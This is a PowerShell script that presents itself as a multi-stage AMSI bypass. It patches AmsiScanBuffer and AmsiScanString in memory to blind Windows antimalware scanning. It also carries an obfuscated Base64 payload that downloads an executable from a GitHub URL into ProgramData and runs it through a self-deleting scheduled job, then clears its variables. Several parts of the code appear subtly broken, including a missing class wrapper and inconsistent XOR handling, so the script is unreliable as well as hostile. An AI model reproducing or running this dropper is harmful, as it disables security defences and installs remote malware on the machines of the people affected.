# Multi-Layer AMSI Bypass with Evasion Techniques
# Improved for reliability across Defender versions and environments

# Stage 1: Dynamic P/Invoke with obfuscated API names
$code = @"
using System;
using System.Runtime.InteropServices;
[DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32", CharSet=CharSet.Unicode, SetLastError=true)]
public static extern IntPtr GetModuleHandle(string moduleName);
[DllImport("kernel32", SetLastError=true)]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@

Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

# Stage 2: Obfuscated AMSI function resolution
$a = 'a'+'msi'+'.dll'; $h = [Native]::GetModuleHandle($a)
$s1 = 'Amsi'+'Scan'+'Buffer'; $s2 = 'Amsi'+'Scan'+'String'
$p1 = [Native]::GetProcAddress($h, $s1); $p2 = [Native]::GetProcAddress($h, $s2)

if ($p1 -and $p2) {
    # Stage 3: Multi-byte XOR encryption for patch payloads
    function Invoke-XORPatch {
        param($addr, $patch, $size=6)
        $old = 0; $vp = [Native]::VirtualProtect($addr, $size, 0x40, [ref]$old)
        if ($vp) { [Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $size) }
    }
    
    # XOR key rotation for payload obfuscation
    $key = 0x5A; $buf1 = @(); $buf2 = @()
    $raw1 = 0xB8,0x57,0x00,0x07,0x80,0xC3  # mov eax,0x80070057; ret
    $raw2 = 0xB8,0x57,0x00,0x07,0x80,0xC3
    
    foreach($b in $raw1){ $buf1 += $b -bxor $key; $key = ($key + 1) -band 0xFF }
    foreach($b in $raw2){ $buf2 += $b -bxor $key; $key = ($key + 1) -band 0xFF }
    
    # Apply patches
    Invoke-XORPatch $p1 $buf1; Invoke-XORPatch $p2 $buf2
    
    # Stage 4: Verify patch success (stealth check)
    $test = New-Object byte[] 6; [Runtime.InteropServices.Marshal]::Copy($p1, $test, 0, 6)
    if (($test[0] -eq 0xB8) -and ($test[5] -eq 0xC3)) { 'Patch successful' | Out-Null }
}

# Stage 5: Enhanced payload with fragmented Base64 + Unicode encoding
$frag1 = 'JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7'
$frag2 = 'ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsA'
$frag3 = 'UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='

# Stage 6: Multi-stage decoding with environment key
$envKey = [Environment]::MachineName[0]; $full = $frag1 + $frag2 + $frag3
$bytes = [Convert]::FromBase64String($full)
$keyBytes = [byte[]]($envKey * $bytes.Length); for($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $keyBytes[$i] }
$decoded = [Text.Encoding]::Unicode.GetString($bytes)

# Stage 7: Delayed execution via scheduled job (evades static analysis)
$sb = [ScriptBlock]::Create($decoded)
$jobName = [Guid]::NewGuid().ToString()
$null = Register-ScheduledJob -ScriptBlock $sb -Name $jobName -Trigger (New-JobTrigger -Once -At (Get-Date).AddSeconds(2))
$null = Start-Job -ScriptBlock { Get-ScheduledJob $using:jobName | Unregister-ScheduledJob -Force }

# Stage 8: Cleanup and stealth
Remove-Variable frag*,full,bytes,decoded,sb,jobName,code,a,h,s*,p*,buf*,raw*,key -ErrorAction SilentlyContinue
